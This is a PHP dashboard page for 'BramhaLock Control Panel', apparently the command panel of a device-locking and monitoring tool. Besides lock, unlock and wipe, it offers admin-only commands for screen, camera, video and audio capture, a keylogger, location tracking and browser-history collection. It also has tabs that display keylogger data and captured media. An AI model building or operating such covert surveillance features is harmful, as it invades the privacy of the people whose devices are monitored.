<?php
session_start();
require_once 'config/database.php';
require_once 'includes/functions.php';

// Check if user is logged in
if (!isset($_SESSION['user_id'])) {
    header('Location: login.php');
    exit();
}

$user_role = $_SESSION['user_role'];
$user_id = $_SESSION['user_id'];

// Handle AJAX requests
if (isset($_POST['action'])) {
    header('Content-Type: application/json');
    
    switch ($_POST['action']) {
        case 'send_command':
            if ($user_role === 'admin' || in_array($_POST['command'], ['lock', 'unlock'])) {
                $result = sendRemoteCommand($_POST['device_id'], $_POST['command'], $_POST['payload'] ?? '');
                echo json_encode(['success' => $result]);
            } else {
                echo json_encode(['success' => false, 'error' => 'Unauthorized']);
            }
            break;
            
        case 'get_devices':
            $devices = getDevices($user_role === 'admin' ? null : $user_id);
            echo json_encode($devices);
            break;
            
        case 'get_security_events':
            if ($user_role === 'admin') {
                $events = getSecurityEvents($_POST['device_id'] ?? null, $_POST['limit'] ?? 50);
                echo json_encode($events);
            }
            break;
            
        case 'get_failed_attempts':
            if ($user_role === 'admin') {
                $attempts = getFailedAttempts($_POST['device_id'] ?? null, $_POST['limit'] ?? 20);
                echo json_encode($attempts);
            }
            break;
            
        case 'get_media_captures':
            if ($user_role === 'admin') {
                $captures = getMediaCaptures($_POST['device_id'] ?? null, $_POST['type'] ?? null);
                echo json_encode($captures);
            }
            break;
            
        case 'send_message':
            if ($user_role === 'admin') {
                $result = sendAdminMessage($user_id, $_POST['device_id'], $_POST['title'], $_POST['content'], $_POST['type']);
                echo json_encode(['success' => $result]);
            }
            break;
            
        case 'get_usage_stats':
            $stats = getUsageStats($_POST['device_id'], $user_role === 'admin' ? null : $user_id);
            echo json_encode($stats);
            break;
    }
    exit();
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BramhaLock Control Panel</title>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/tailwindcss/2.2.19/tailwind.min.css" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>
        .gradient-bg { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); }
        .card-hover { transition: all 0.3s ease; }
        .card-hover:hover { transform: translateY(-2px); box-shadow: 0 10px 25px rgba(0,0,0,0.1); }
        .status-online { color: #10b981; }
        .status-offline { color: #ef4444; }
        .status-locked { color: #f59e0b; }
        .modal { display: none; }
        .modal.active { display: flex; }
    </style>
</head>
<body class="bg-gray-100">
    <!-- Header -->
    <header class="gradient-bg text-white shadow-lg">
        <div class="container mx-auto px-6 py-4">
            <div class="flex items-center justify-between">
                <div class="flex items-center space-x-4">
                    <i class="fas fa-shield-alt text-2xl"></i>
                    <h1 class="text-2xl font-bold">BramhaLock Control Panel</h1>
                </div>
                <div class="flex items-center space-x-4">
                    <span class="text-sm">Welcome, <?php echo htmlspecialchars($_SESSION['user_name']); ?></span>
                    <span class="px-3 py-1 bg-white bg-opacity-20 rounded-full text-xs">
                        <?php echo ucfirst($user_role); ?>
                    </span>
                    <a href="logout.php" class="text-white hover:text-gray-200">
                        <i class="fas fa-sign-out-alt"></i>
                    </a>
                </div>
            </div>
        </div>
    </header>

    <div class="container mx-auto px-6 py-8">
        <!-- Dashboard Stats -->
        <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6 mb-8">
            <div class="bg-white rounded-lg shadow-md p-6 card-hover">
                <div class="flex items-center">
                    <div class="p-3 rounded-full bg-green-100 text-green-600">
                        <i class="fas fa-desktop text-xl"></i>
                    </div>
                    <div class="ml-4">
                        <p class="text-sm text-gray-600">Online Devices</p>
                        <p class="text-2xl font-semibold" id="online-count">0</p>
                    </div>
                </div>
            </div>
            
            <div class="bg-white rounded-lg shadow-md p-6 card-hover">
                <div class="flex items-center">
                    <div class="p-3 rounded-full bg-red-100 text-red-600">
                        <i class="fas fa-lock text-xl"></i>
                    </div>
                    <div class="ml-4">
                        <p class="text-sm text-gray-600">Locked Devices</p>
                        <p class="text-2xl font-semibold" id="locked-count">0</p>
                    </div>
                </div>
            </div>
            
            <?php if ($user_role === 'admin'): ?>
            <div class="bg-white rounded-lg shadow-md p-6 card-hover">
                <div class="flex items-center">
                    <div class="p-3 rounded-full bg-yellow-100 text-yellow-600">
                        <i class="fas fa-exclamation-triangle text-xl"></i>
                    </div>
                    <div class="ml-4">
                        <p class="text-sm text-gray-600">Failed Attempts</p>
                        <p class="text-2xl font-semibold" id="failed-count">0</p>
                    </div>
                </div>
            </div>
            
            <div class="bg-white rounded-lg shadow-md p-6 card-hover">
                <div class="flex items-center">
                    <div class="p-3 rounded-full bg-blue-100 text-blue-600">
                        <i class="fas fa-camera text-xl"></i>
                    </div>
                    <div class="ml-4">
                        <p class="text-sm text-gray-600">Media Captures</p>
                        <p class="text-2xl font-semibold" id="media-count">0</p>
                    </div>
                </div>
            </div>
            <?php endif; ?>
        </div>

        <!-- Main Content Tabs -->
        <div class="bg-white rounded-lg shadow-md">
            <div class="border-b border-gray-200">
                <nav class="flex space-x-8 px-6">
                    <button class="tab-btn active py-4 px-2 border-b-2 border-blue-500 text-blue-600 font-medium" data-tab="devices">
                        <i class="fas fa-desktop mr-2"></i>Devices
                    </button>
                    <?php if ($user_role === 'admin'): ?>
                    <button class="tab-btn py-4 px-2 border-b-2 border-transparent text-gray-500 hover:text-gray-700" data-tab="security">
                        <i class="fas fa-shield-alt mr-2"></i>Security Events
                    </button>
                    <button class="tab-btn py-4 px-2 border-b-2 border-transparent text-gray-500 hover:text-gray-700" data-tab="captures">
                        <i class="fas fa-camera mr-2"></i>Media Captures
                    </button>
                    <button class="tab-btn py-4 px-2 border-b-2 border-transparent text-gray-500 hover:text-gray-700" data-tab="keylogger">
                        <i class="fas fa-keyboard mr-2"></i>Keylogger
                    </button>
                    <button class="tab-btn py-4 px-2 border-b-2 border-transparent text-gray-500 hover:text-gray-700" data-tab="messages">
                        <i class="fas fa-envelope mr-2"></i>Messages
                    </button>
                    <?php endif; ?>
                </nav>
            </div>

            <!-- Devices Tab -->
            <div id="devices-tab" class="tab-content p-6">
                <div class="flex justify-between items-center mb-6">
                    <h2 class="text-xl font-semibold">Device Management</h2>
                    <button onclick="refreshDevices()" class="bg-blue-500 text-white px-4 py-2 rounded-lg hover:bg-blue-600">
                        <i class="fas fa-sync-alt mr-2"></i>Refresh
                    </button>
                </div>
                
                <div class="overflow-x-auto">
                    <table class="min-w-full table-auto">
                        <thead class="bg-gray-50">
                            <tr>
                                <th class="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase">Device</th>
                                <th class="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase">Status</th>
                                <th class="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase">Last Seen</th>
                                <th class="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase">Location</th>
                                <th class="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase">Actions</th>
                            </tr>
                        </thead>
                        <tbody id="devices-table" class="bg-white divide-y divide-gray-200">
                            <!-- Devices will be loaded here -->
                        </tbody>
                    </table>
                </div>
            </div>

            <?php if ($user_role === 'admin'): ?>
            <!-- Security Events Tab -->
            <div id="security-tab" class="tab-content p-6 hidden">
                <div class="flex justify-between items-center mb-6">
                    <h2 class="text-xl font-semibold">Security Events</h2>
                    <select id="security-device-filter" class="border border-gray-300 rounded-lg px-3 py-2">
                        <option value="">All Devices</option>
                    </select>
                </div>
                <div id="security-events" class="space-y-4">
                    <!-- Security events will be loaded here -->
                </div>
            </div>

            <!-- Media Captures Tab -->
            <div id="captures-tab" class="tab-content p-6 hidden">
                <div class="flex justify-between items-center mb-6">
                    <h2 class="text-xl font-semibold">Media Captures</h2>
                    <div class="flex space-x-4">
                        <select id="capture-type-filter" class="border border-gray-300 rounded-lg px-3 py-2">
                            <option value="">All Types</option>
                            <option value="screenshot">Screenshots</option>
                            <option value="camera">Camera</option>
                            <option value="video">Video</option>
                            <option value="audio">Audio</option>
                        </select>
                        <select id="capture-device-filter" class="border border-gray-300 rounded-lg px-3 py-2">
                            <option value="">All Devices</option>
                        </select>
                    </div>
                </div>
                <div id="media-captures" class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
                    <!-- Media captures will be loaded here -->
                </div>
            </div>

            <!-- Keylogger Tab -->
            <div id="keylogger-tab" class="tab-content p-6 hidden">
                <div class="flex justify-between items-center mb-6">
                    <h2 class="text-xl font-semibold">Keylogger Data</h2>
                    <select id="keylogger-device-filter" class="border border-gray-300 rounded-lg px-3 py-2">
                        <option value="">All Devices</option>
                    </select>
                </div>
                <div id="keylogger-data" class="space-y-4">
                    <!-- Keylogger data will be loaded here -->
                </div>
            </div>

            <!-- Messages Tab -->
            <div id="messages-tab" class="tab-content p-6 hidden">
                <div class="flex justify-between items-center mb-6">
                    <h2 class="text-xl font-semibold">Admin Messages</h2>
                    <button onclick="showMessageModal()" class="bg-green-500 text-white px-4 py-2 rounded-lg hover:bg-green-600">
                        <i class="fas fa-plus mr-2"></i>Send Message
                    </button>
                </div>
                <div id="admin-messages" class="space-y-4">
                    <!-- Messages will be loaded here -->
                </div>
            </div>
            <?php endif; ?>
        </div>
    </div>

    <!-- Command Modal -->
    <div id="command-modal" class="modal fixed inset-0 bg-black bg-opacity-50 items-center justify-center z-50">
        <div class="bg-white rounded-lg p-6 w-full max-w-md mx-4">
            <div class="flex justify-between items-center mb-4">
                <h3 class="text-lg font-semibold">Send Command</h3>
                <button onclick="closeModal('command-modal')" class="text-gray-400 hover:text-gray-600">
                    <i class="fas fa-times"></i>
                </button>
            </div>
            <form id="command-form">
                <input type="hidden" id="command-device-id">
                <div class="mb-4">
                    <label class="block text-sm font-medium text-gray-700 mb-2">Command</label>
                    <select id="command-type" class="w-full border border-gray-300 rounded-lg px-3 py-2">
                        <option value="lock">Lock Device</option>
                        <option value="unlock">Unlock Device</option>
                        <?php if ($user_role === 'admin'): ?>
                        <option value="wipe">Wipe Device</option>
                        <option value="capture_screen">Capture Screen</option>
                        <option value="capture_camera">Capture Camera</option>
                        <option value="capture_video">Capture Video</option>
                        <option value="capture_audio">Capture Audio</option>
                        <option value="keylogger_start">Start Keylogger</option>
                        <option value="keylogger_stop">Stop Keylogger</option>
                        <option value="get_location">Get Location</option>
                        <option value="get_browser_history">Get Browser History</option>
                        <?php endif; ?>
                    </select>
                </div>
                <div class="mb-4" id="command-payload-section" style="display: none;">
                    <label class="block text-sm font-medium text-gray-700 mb-2">Additional Parameters</label>
                    <textarea id="command-payload" class="w-full border border-gray-300 rounded-lg px-3 py-2" rows="3"></textarea>
                </div>
                <div class="flex justify-end space-x-4">
                    <button type="button" onclick="closeModal('command-modal')" class="px-4 py-2 text-gray-600 hover:text-gray-800">Cancel</button>
                    <button type="submit" class="bg-blue-500 text-white px-4 py-2 rounded-lg hover:bg-blue-600">Send Command</button>
                </div>
            </form>
        </div>
    </div>

    <?php if ($user_role === 'admin'): ?>
    <!-- Message Modal -->
    <div id="message-modal" class="modal fixed inset-0 bg-black bg-opacity-50 items-center justify-center z-50">
        <div class="bg-white rounded-lg p-6 w-full max-w-md mx-4">
            <div class="flex justify-between items-center mb-4">
                <h3 class="text-lg font-semibold">Send Message</h3>
                <button onclick="closeModal('message-modal')" class="text-gray-400 hover:text-gray-600">
                    <i class="fas fa-times"></i>
                </button>
            </div>
            <form id="message-form">
                <div class="mb-4">
                    <label class="block text-sm font-medium text-gray-700 mb-2">Target Device</label>
                    <select id="message-device-id" class="w-full border border-gray-300 rounded-lg px-3 py-2">
                        <option value="">All Devices (Broadcast)</option>
                    </select>
                </div>
                <div class="mb-4">
                    <label class="block text-sm font-medium text-gray-700 mb-2">Message Type</label>
                    <select id="message-type" class="w-full border border-gray-300 rounded-lg px-3 py-2">
                        <option value="info">Information</option>
                        <option value="warning">Warning</option>
                        <option value="critical">Critical</option>
                    </select>
                </div>
                <div class="mb-4">
                    <label class="block text-sm font-medium text-gray-700 mb-2">Title</label>
                    <input type="text" id="message-title" class="w-full border border-gray-300 rounded-lg px-3 py-2" required>
                </div>
                <div class="mb-4">
                    <label class="block text-sm font-medium text-gray-700 mb-2">Message</label>
                    <textarea id="message-content" class="w-full border border-gray-300 rounded-lg px-3 py-2" rows="4" required></textarea>
                </div>
                <div class="flex justify-end space-x-4">
                    <button type="button" onclick="closeModal('message-modal')" class="px-4 py-2 text-gray-600 hover:text-gray-800">Cancel</button>
                    <button type="submit" class="bg-green-500 text-white px-4 py-2 rounded-lg hover:bg-green-600">Send Message</button>
                </div>
            </form>
        </div>
    </div>
    <?php endif; ?>

    <script src="js/dashboard.js"></script>
</body>
</html>
